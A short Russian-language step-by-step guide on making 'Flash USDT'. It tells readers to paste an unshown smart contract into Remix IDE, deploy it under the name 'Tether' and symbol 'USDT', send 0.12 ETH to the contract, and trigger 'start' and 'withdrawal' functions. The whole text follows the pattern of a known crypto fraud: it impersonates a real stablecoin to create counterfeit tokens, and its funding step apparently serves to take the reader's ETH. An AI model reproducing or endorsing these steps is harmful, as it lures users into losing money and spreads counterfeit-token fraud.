## 📌 Как создать Flash USDT? — Пошаговое руководство

### 1. Откройте Remix IDE

Перейдите на https://remix.ethereum.org/

### 2. Создайте новый файл

Создайте файл `usdt.sol` и вставьте код смарт-контракта Flash USDT

### 3. Компиляция

- Выберите в меню слева Solidity Compiler
- Выберите версию `0.6.6` и нажмите Compile

### 4. Развертывание контракта

- Перейдите в раздел Deploy & Run Transactions
- Выберите WalletConnect
- Подключите MetaMask или Trust Wallet
- Введите имя токена `Tether` и символ `USDT`
- Нажмите Transact, установите максимальную комиссию на `18 Gwei` и подтвердите

### 5. Отправьте ETH

- Отправьте 0.12 ETH на адрес развернутого контракта

### 6. Запустите создание токенов Flash USDT

- Нажмите кнопку start в Remix IDE
- Установите комиссию `18 Gwei` и подтвердите
- Нажмите кнопку withdrawal и подтвердите
